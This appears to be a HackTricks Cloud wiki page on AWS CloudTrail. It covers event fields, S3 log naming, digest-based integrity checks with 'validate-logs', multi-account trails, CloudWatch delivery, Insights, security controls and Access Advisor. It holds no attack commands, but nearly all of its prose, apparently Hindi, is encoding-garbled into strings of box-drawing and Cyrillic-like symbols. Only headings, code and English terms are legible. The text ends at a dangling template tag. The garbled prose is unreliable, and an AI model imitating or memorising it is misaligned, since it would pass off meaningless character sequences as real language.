# AWS - CloudTrail Enum

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **рдЖрдкрдХреЗ AWS рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рднреАрддрд░ рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рд░рд┐рдХреЙрд░реНрдб рдФрд░ рдореЙрдирд┐рдЯрд░ рдХрд░рддрд╛ рд╣реИ**ред рдпрд╣ рд╡рд┐рд╕реНрддреГрдд **рдЗрд╡реЗрдВрдЯ рд▓реЙрдЧреНрд╕** рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХреМрди, рдХрдм, рдФрд░ рдХрд╣рд╛рдБ рд╕реЗ AWS рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЗ рд╕рд╛рде рд╕рднреА рдЗрдВрдЯрд░реИрдХреНрд╢рди рдХрд┐рдП рдЧрдП рдереЗред рдпрд╣ рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдФрд░ рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рдПрдХ рдСрдбрд┐рдЯ рдЯреНрд░реЗрд▓ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЬреЛ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг, рдЕрдиреБрдкрд╛рд▓рди рдСрдбрд┐рдЯрд┐рдВрдЧ, рдФрд░ рд╕рдВрд╕рд╛рдзрди рдкрд░рд┐рд╡рд░реНрддрди рдЯреНрд░реИрдХрд┐рдВрдЧ рдореЗрдВ рд╕рд╣рд╛рдпрддрд╛ рдХрд░рддрд╛ рд╣реИред CloudTrail рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рд╕рдВрд╕рд╛рдзрди рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд╕рдордЭрдиреЗ, рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрдерд┐рддрд┐ рдХреЛ рдмрдврд╝рд╛рдиреЗ, рдФрд░ рдирд┐рдпрд╛рдордХ рдЕрдиреБрдкрд╛рд▓рди рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ рд▓реЙрдЧ рдХрд┐рдП рдЧрдП рдЗрд╡реЗрдВрдЯ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ:

* рдХреЙрд▓ рдХрд┐рдП рдЧрдП API рдХрд╛ рдирд╛рдо: `eventName`
* рдХреЙрд▓ рдХреА рдЧрдИ рд╕реЗрд╡рд╛: `eventSource`
* рд╕рдордп: `eventTime`
* IP рдкрддрд╛: `SourceIPAddress`
* рдПрдЬреЗрдВрдЯ рд╡рд┐рдзрд┐: `userAgent`. рдЙрджрд╛рд╣рд░рдг:
* Signing.amazonaws.com - AWS Management Console рд╕реЗ
* console.amazonaws.com - рдЦрд╛рддреЗ рдХрд╛ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛
* lambda.amazonaws.com - AWS Lambda
* рдЕрдиреБрд░реЛрдз рдкреИрд░рд╛рдореАрдЯрд░: `requestParameters`
* рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рддрддреНрд╡: `responseElements`

рдЗрд╡реЗрдВрдЯреНрд╕ рдХреЛ **рд▓рдЧрднрдЧ рд╣рд░ 5 рдорд┐рдирдЯ рдореЗрдВ рдПрдХ рдирдП рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ JSON рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ**, рдЗрдиреНрд╣реЗрдВ CloudTrail рджреНрд╡рд╛рд░рд╛ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЕрдВрддрддрдГ, рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ **рд▓рдЧрднрдЧ 15 рдорд┐рдирдЯ рдмрд╛рдж S3 рдореЗрдВ рд╡рд┐рддрд░рд┐рдд рдХреА рдЬрд╛рддреА рд╣реИрдВ**ред\
CloudTrails рд▓реЙрдЧреНрд╕ рдХреЛ **рдЕрдХрд╛рдЙрдВрдЯреНрд╕ рдФрд░ рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рдПрдХрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред**\
CloudTrail **рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рдЕрдЦрдВрдбрддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдХрд┐ рдЖрдкрдХреА рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ CloudTrail рджреНрд╡рд╛рд░рд╛ рдЖрдкрдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж рдЕрдкрд░рд┐рд╡рд░реНрддрд┐рдд рд░рд╣реА рд╣реИрдВ**ред рдпрд╣ рд▓реЙрдЧреНрд╕ рдХреЗ рдЕрдВрджрд░ рдПрдХ SHA-256 рд╣реИрд╢ рдмрдирд╛рддрд╛ рд╣реИред рдирдП рд▓реЙрдЧреНрд╕ рдХрд╛ рдПрдХ sha-256 рд╣реИрд╢ рд╣рд░ рдШрдВрдЯреЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдЬрдм рдПрдХ Trail рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╡реЗрдВрдЯ рдЪрдпрдирдХрд░реНрддрд╛ рдЖрдкрдХреЛ рдЯреНрд░реЗрд▓ рдХреЛ рд▓реЙрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ: рдкреНрд░рдмрдВрдзрди, рдбреЗрдЯрд╛ рдпрд╛ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдЗрд╡реЗрдВрдЯреНрд╕ред

рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдХ S3 рдмрдХреЗрдЯ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╕рд░реНрд╡рд░ рд╕рд╛рдЗрдб рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди (SSE-S3) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ AWS рдЙрди рд▓реЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╛рдордЧреНрд░реА рдХреЛ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХреЗ рдЬрд┐рдирдХреЗ рдкрд╛рд╕ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ, рд▓реЗрдХрд┐рди рдЕрддрд┐рд░рд┐рдХреНрдд рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд▓рд┐рдП рдЖрдк SSE рдХреЛ KMS рдФрд░ рдЕрдкрдиреА рдЦреБрдж рдХреА рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдХ **S3 рдмрдХреЗрдЯ рдореЗрдВ рдЗрд╕ рдирд╛рдо рдкреНрд░рд╛рд░реВрдк рдХреЗ рд╕рд╛рде рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* рдмрдХреЗрдЯ рдХрд╛ рдирд╛рдо: **`aws-cloudtrail-logs-<accountid>-<random>`**
* рдЙрджрд╛рд╣рд░рдг: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

рдкреНрд░рддреНрдпреЗрдХ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рддреНрдпреЗрдХ рд▓реЙрдЧ рдХрд╛ **рдирд╛рдо рдЗрд╕ рдкреНрд░рд╛рд░реВрдк рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдЧрд╛**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдирд╛рдордХрд░рдг рд╕рдореНрдореЗрд▓рди

![](<../../../../.gitbook/assets/image (122).png>)

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдлрд╝рд╛рдЗрд▓реЗрдВ (рдлрд╝рд╛рдЗрд▓ рдЕрдЦрдВрдбрддрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП)** **рдЙрд╕реА рдмрдХреЗрдЯ** рдореЗрдВ рд╣реЛрдВрдЧреА:

![](<../../../../.gitbook/assets/image (195).png>)

### рдХрдИ рдЕрдХрд╛рдЙрдВрдЯреНрд╕ рд╕реЗ рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдХрддреНрд░рд┐рдд рдХрд░рдирд╛

* рдЙрд╕ AWS рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдПрдХ рдЯреНрд░рд╛рдпрд▓ рдмрдирд╛рдПрдВ рдЬрд╣рд╛рдВ рдЖрдк рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╡рд┐рддрд░рд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ
* рдЧрдВрддрд╡реНрдп S3 рдмрдХреЗрдЯ рдкрд░ рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд▓рд╛рдЧреВ рдХрд░реЗрдВ рдЬреЛ CloudTrail рдХреЗ рд▓рд┐рдП рдХреНрд░реЙрд╕-рдЕрдХрд╛рдЙрдВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ рдФрд░ рдкреНрд░рддреНрдпреЗрдХ AWS рдЕрдХрд╛рдЙрдВрдЯ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВ рдЬрд┐рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ
* рдЕрдиреНрдп AWS рдЕрдХрд╛рдЙрдВрдЯреНрд╕ рдореЗрдВ рдПрдХ рдирдпрд╛ рдЯреНрд░реЗрд▓ рдмрдирд╛рдПрдВ рдФрд░ рдЪрд░рдг 1 рдореЗрдВ рдмрдирд╛рдП рдЧрдП рдмрдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ

рд╣рд╛рд▓рд╛рдВрдХрд┐, рднрд▓реЗ рд╣реА рдЖрдк рд╕рднреА рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдХ рд╣реА S3 рдмрдХреЗрдЯ рдореЗрдВ рд╕рд╣реЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк рдПрдХрд▓ AWS рдЕрдХрд╛рдЙрдВрдЯ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд CloudWatch рд▓реЙрдЧреНрд╕ рдореЗрдВ рдХрдИ рдЕрдХрд╛рдЙрдВрдЯреНрд╕ рд╕реЗ CloudTrail рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдХрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред

{% hint style="danger" %}
рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдПрдХ рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ **рд╡рд┐рднрд┐рдиреНрди Trails** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ CloudTrail рд╕реЗ **рд╕рдХреНрд╖рдо** рд╣реИрдВ рдФрд░ рд╡рд┐рднрд┐рдиреНрди рдмрдХреЗрдЯреНрд╕ рдореЗрдВ рд╕рдорд╛рди (рдпрд╛ рдЕрд▓рдЧ) рд▓реЙрдЧреНрд╕ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### рд╕рднреА рд╕рдВрдЧрдарди рдЕрдХрд╛рдЙрдВрдЯреНрд╕ рд╕реЗ 1 рдореЗрдВ Cloudtrail

рдЬрдм рдПрдХ CloudTrail рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╕рдВрдХреЗрдд рджреЗрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рд╕рднреА рд╕рдВрдЧрдарди рдЕрдХрд╛рдЙрдВрдЯреНрд╕ рдХреЗ рд▓рд┐рдП CloudTrail рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдВ рдФрд░ рд▓реЙрдЧреНрд╕ рдХреЛ рдХреЗрд╡рд▓ 1 рдмрдХреЗрдЯ рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

рдЗрд╕ рддрд░рд╣ рдЖрдк рд╕рднреА рдЕрдХрд╛рдЙрдВрдЯреНрд╕ рдХреЗ рд╕рднреА рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рдЖрд╕рд╛рдиреА рд╕реЗ CloudTrail рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд▓реЙрдЧреНрд╕ рдХреЛ 1 рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рдХреЗрдВрджреНрд░реАрдХреГрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬрд┐рд╕реЗ рдЖрдкрдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдирд╛ рдЪрд╛рд╣рд┐рдП)ред

### рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЬрд╛рдБрдЪ

рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рд▓реЙрдЧреНрд╕ рдХреЛ рдмрджрд▓рд╛ рдирд╣реАрдВ рдЧрдпрд╛ рд╣реИ, рдЗрд╕реЗ рдЪрд▓рд╛рдХрд░

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs to CloudWatch

**CloudTrail рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд▓реЙрдЧреНрд╕ рдХреЛ CloudWatch рдкрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЕрд▓рд░реНрдЯ рд╕реЗрдЯ рдХрд░ рд╕рдХреЗрдВ рдЬреЛ рдЖрдкрдХреЛ рдЪреЗрддрд╛рд╡рдиреА рджреЗрддреЗ рд╣реИрдВ рдЬрдм рд╕рдВрджрд┐рдЧреНрдз рдЧрддрд┐рд╡рд┐рдзрд┐рдпрд╛рдБ рдХреА рдЬрд╛рддреА рд╣реИрдВред**\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ CloudTrail рдХреЛ рд▓реЙрдЧреНрд╕ рдХреЛ CloudWatch рдкрд░ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **role** рдмрдирд╛рдиреА рд╣реЛрдЧреА рдЬреЛ рдЙрд╕ рдХреНрд░рд┐рдпрд╛ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ, рддреЛ рдЗрди рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП AWS рдбрд┐рдлрд╝реЙрд▓реНрдЯ role рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рд╕рд┐рдлрд╛рд░рд┐рд╢ рдХреА рдЬрд╛рддреА рд╣реИред рдпрд╣ role CloudTrail рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛:

* CreateLogStream: рдпрд╣ CloudWatch Logs рд▓реЙрдЧ рд╕реНрдЯреНрд░реАрдореНрд╕ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
* PutLogEvents: CloudTrail рд▓реЙрдЧреНрд╕ рдХреЛ CloudWatch Logs рд▓реЙрдЧ рд╕реНрдЯреНрд░реАрдо рдореЗрдВ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ

### Event History

CloudTrail Event History рдЖрдкрдХреЛ рдПрдХ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рд░рд┐рдХреЙрд░реНрдб рдХрд┐рдП рдЧрдП рд▓реЙрдЧреНрд╕ рдХрд╛ рдирд┐рд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights** рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ CloudTrail рдЯреНрд░реЗрд▓реНрд╕ рд╕реЗ рд▓рд┐рдЦрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдмрдВрдзрди рдШрдЯрдирд╛рдУрдВ рдХрд╛ **рд╡рд┐рд╢реНрд▓реЗрд╖рдг** рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЖрдкрдХреЛ **рдЕрд╕рд╛рдорд╛рдиреНрдп рдЧрддрд┐рд╡рд┐рдзрд┐** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдЪреЗрддрд╛рд╡рдиреА** рджреЗрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ `TerminateInstance` рдШрдЯрдирд╛рдУрдВ рдореЗрдВ рд╡реГрджреНрдзрд┐ рд╣реЛрддреА рд╣реИ рдЬреЛ рд╕реНрдерд╛рдкрд┐рдд рдмреЗрд╕рд▓рд╛рдЗрдиреЛрдВ рд╕реЗ рднрд┐рдиреНрди рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдПрдХ Insight рдШрдЯрдирд╛ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦреЗрдВрдЧреЗред рдпреЗ рдШрдЯрдирд╛рдПрдБ **рдЕрд╕рд╛рдорд╛рдиреНрдп API рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рдвреВрдВрдврдирд╛ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдирд╛ рдкрд╣рд▓реЗ рд╕реЗ рдХрд╣реАрдВ рдЕрдзрд┐рдХ рдЖрд╕рд╛рди рдмрдирд╛рддреА рд╣реИрдВ**ред

Insights рдЙрд╕реА рдмрдХреЗрдЯ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ CloudTrail рд▓реЙрдЧреНрд╕: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Security

| CloudTrail Log File Integrity        | <ul><li>рдЬрд╛рдБрдЪреЗрдВ рдХрд┐ рд▓реЙрдЧреНрд╕ рдХреЗ рд╕рд╛рде рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ (рд╕рдВрд╢реЛрдзрд┐рдд рдпрд╛ рд╣рдЯрд╛рдпрд╛ рдЧрдпрд╛) рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ</li><li><p>рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдлрд╛рдЗрд▓реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ (рдкреНрд░рддреНрдпреЗрдХ рдлрд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рд╣реИрд╢ рдмрдирд╛рддрд╛ рд╣реИ)</p><ul><li>SHA-256 рд╣реИрд╢рд┐рдВрдЧ</li><li>SHA-256 рдХреЗ рд╕рд╛рде RSA рдбрд┐рдЬрд┐рдЯрд▓ рд╕рд╛рдЗрдирд┐рдВрдЧ рдХреЗ рд▓рд┐рдП</li><li>рдирд┐рдЬреА рдХреБрдВрдЬреА Amazon рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡</li></ul></li><li>рдбрд╛рдЗрдЬреЗрд╕реНрдЯ рдлрд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдореЗрдВ 1 рдШрдВрдЯрд╛ рд▓рдЧрддрд╛ рд╣реИ (рд╣рд░ рдШрдВрдЯреЗ рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Stop unauthorized access             | <ul><li><p>IAM рдиреАрддрд┐рдпреЛрдВ рдФрд░ S3 рдмрдХреЗрдЯ рдиреАрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ</p><ul><li>рд╕реБрд░рдХреНрд╖рд╛ рдЯреАрдо тАФ> рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдкрд╣реБрдВрдЪ</li><li>рдСрдбрд┐рдЯрд░реНрд╕ тАФ> рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреА рдкрд╣реБрдВрдЪ</li></ul></li><li>рд▓реЙрдЧреНрд╕ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП SSE-S3/SSE-KMS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ</li></ul>                                                                                                                                        |
| Prevent log files from being deleted | <ul><li>IAM рдФрд░ рдмрдХреЗрдЯ рдиреАрддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд╣рдЯрд╛рдиреЗ рдХреА рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░реЗрдВ</li><li>S3 MFA delete рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ</li><li>рд▓реЙрдЧ рдлрд╛рдЗрд▓ рд╡реИрд▓рд┐рдбреЗрд╢рди рдХреЗ рд╕рд╛рде рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВ</li></ul>                                                                                                                                                                                            |

## Access Advisor

AWS Access Advisor рдкрд┐рдЫрд▓реЗ 400 рджрд┐рдиреЛрдВ рдХреЗ AWS **CloudTrail рд▓реЙрдЧреНрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ**ред CloudTrail AWS рдЦрд╛рддреЗ рдореЗрдВ рдХрд┐рдП рдЧрдП AWS API рдХреЙрд▓реНрд╕ рдФрд░ рд╕рдВрдмрдВрдзрд┐рдд рдШрдЯрдирд╛рдУрдВ рдХрд╛ рдЗрддрд┐рд╣рд╛рд╕ рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИред Access Advisor рдЗрд╕ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ **рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рдЖрдЦрд┐рд░реА рдмрд╛рд░ рдХрдм рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛**ред CloudTrail рд▓реЙрдЧреНрд╕ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ, Access Advisor рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА IAM рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ role рдиреЗ рдХрд┐рди AWS рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдФрд░ рд╡рд╣ рдПрдХреНрд╕реЗрд╕ рдХрдм рд╣реБрдЖред рдЗрд╕рд╕реЗ AWS рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ **рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкрд░рд┐рд╖реНрдХреГрдд рдХрд░рдиреЗ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реВрдЪрд┐рдд рдирд┐рд░реНрдгрдп рд▓реЗрдиреЗ рдореЗрдВ рдорджрдж рдорд┐рд▓рддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдЙрди рд╕реЗрд╡рд╛рдУрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рд▓рдВрдмреЗ рд╕рдордп рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдЙрдкрдпреЛрдЧ рдкреИрдЯрд░реНрди рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЕрддреНрдпрдзрд┐рдХ рд╡реНрдпрд╛рдкрдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдХрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="success" %}
